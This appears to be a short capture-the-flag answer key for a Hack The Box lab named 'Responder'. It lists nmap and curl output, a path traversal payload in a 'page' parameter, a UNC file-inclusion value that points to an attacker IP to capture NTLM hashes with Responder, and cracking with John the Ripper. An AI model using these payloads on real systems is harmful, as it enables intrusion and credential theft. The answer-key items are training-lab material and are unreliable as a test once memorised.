# Responder
## task 1
```
┌──(root㉿cbfc9d3c3a36)-[/]
└─# nmap -p-10000 -sV -T4 <your target ip>
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-06 03:03 UTC
Nmap scan report for <your target ip>
Host is up (0.19s latency).
Not shown: 9998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.59 seconds
```
2
## task 2
```
┌──(root㉿cbfc9d3c3a36)-[/]
└─# curl -L <your target ip>
<meta http-equiv="refresh" content="0;url=http://unika.htb/">
```
unika.htb
## task 3
```
┌──(root㉿cbfc9d3c3a36)-[/]
└─# echo -e "10.129.161.67\tunika.htb" >> /etc/hosts
```
php
## task 4
```
http://unika.htb/index.php?page=german.html
```
page
## task 5
../../../../../../../../windows/system32/drivers/etc/hosts
## task 6
//10.10.14.6/somefile
## task 7
New Technology LAN Manager
## task 8
```
responder -I
```
## task 9
john the ripper